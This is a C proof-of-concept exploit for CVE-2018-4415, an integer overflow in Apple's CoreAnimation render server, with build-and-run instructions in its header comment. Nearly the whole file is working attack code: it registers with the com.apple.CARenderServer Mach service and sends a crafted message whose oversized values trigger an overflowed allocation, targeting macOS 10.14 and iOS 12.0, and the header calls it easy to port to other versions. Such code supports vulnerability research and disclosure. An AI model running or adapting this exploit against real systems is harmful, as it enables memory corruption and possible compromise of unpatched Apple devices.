/**
 *  Brief: Integer overflow in CoreAnimation, CVE-2018-4415
 *  Usage:
 *    1. clang FunctionIntOverFlow.c -o function_over_flow 
 *    2. ./function_over_flow
 *
 *  Specifically, `CA::Render::InterpolatedFunction::allocate_storage` function in QuartzCore does
 *  not do any check for integer overflow in expression |result = (char *)malloc(4 * (v4 + v3));|.
 *
 *  The bug has been fixed in macOS 10.14.1 and iOS 12.1, since the interfaces and structure of 
 *  messages are inconsistent between different versions, this PoC may only work on macOS 10.14 and 
 *  iOS 12.0, but it's very easy to replant it to another versions.
 *
 *  Tips for debugging on macOS: Turn Mac to sleep mode and ssh to the target machine, this may 
 *  help you concentrate on your work.
 */



#include <mach/mach.h>
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>


static void do_int_overflow() {

    mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;
    task_get_bootstrap_port(mach_task_self(), &bs_port);
    const char *render_service_name = "com.apple.CARenderServer";
    kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) =
        dlsym(RTLD_DEFAULT, "bootstrap_look_up");
    kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &p);

    if (kr != KERN_SUCCESS) {
        printf("[-] Cannot get service of %s, %s!\n", render_service_name, mach_error_string(kr));
        return;
    }

    typedef struct quartz_register_client_s quartz_register_client_t;
    struct quartz_register_client_s {
        mach_msg_header_t header;
        uint32_t body;
        mach_msg_port_descriptor_t ports[4];
        char padding[12];
    };

    quartz_register_client_t msg_register;
    memset(&msg_register, 0, sizeof(msg_register));
    msg_register.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |
        MACH_MSGH_BITS_COMPLEX;
    msg_register.header.msgh_remote_port = p;
    msg_register.header.msgh_local_port = mig_get_reply_port();
    msg_register.header.msgh_id = 40202;  // _XRegistenClient

    msg_register.body = 4;
    msg_register.ports[0].name = mach_task_self();
    msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;
    msg_register.ports[1].name = mach_task_self();
    msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;
    msg_register.ports[2].name = mach_task_self();
    msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;
    msg_register.ports[3].name = mach_task_self();
    msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;

    kr = mach_msg(&msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,
                  sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),
                  msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] Send message failed: %s\n", mach_error_string(kr));
        return;
    }

    mach_port_t context_port = *(uint32_t *)((uint8_t *)&msg_register + 0x1c);
    uint32_t conn_id = *(uint32_t *)((uint8_t *)&msg_register + 0x30);

	typedef struct quartz_function_int_overflow_s quartz_function_int_overflow_t;
	struct quartz_function_int_overflow_s {
		mach_msg_header_t header;
		char msg_body[0x60];
	};

    quartz_function_int_overflow_t function_int_overflow_msg = {0};
    function_int_overflow_msg.header.msgh_bits =
        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    function_int_overflow_msg.header.msgh_remote_port = context_port;
    function_int_overflow_msg.header.msgh_id = 40002;

    memset(function_int_overflow_msg.msg_body, 0x0, sizeof(function_int_overflow_msg.msg_body));
    *(uint32_t*)(function_int_overflow_msg.msg_body + 0) = 0x1;  // Ports count

    /**
     *	1. One port consumes 12B space
     *	2. This `mach_msg` routine dose not need a port, so set this port to MACH_PORT_NULL(memory
     *	   cleared by memset)
     */

    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 0) = 0xdeadbeef;
    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 4) = conn_id;
    *(int8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16) = 2;
    *(uint64_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 1) = 0xdeadbeefdeadbeef;
    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 9) = 0xffffffff;

    *(uint8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 13) = 0x12;  // Decode Function
    *(uint8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 14) = 0x2;
    /**(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0xDECAFBAD;*/
    *(uint64_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0x2000000000000000;
    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 23) = 1;
    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 27) = 2;
    *(uint8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 31) = 1;

    kr =
        mach_msg(&function_int_overflow_msg.header, MACH_SEND_MSG,
                 sizeof(function_int_overflow_msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] Send message failed: %s\n", mach_error_string(kr));
        return;
    }

    return;
}


int main() {
    do_int_overflow();
    return 0;
}
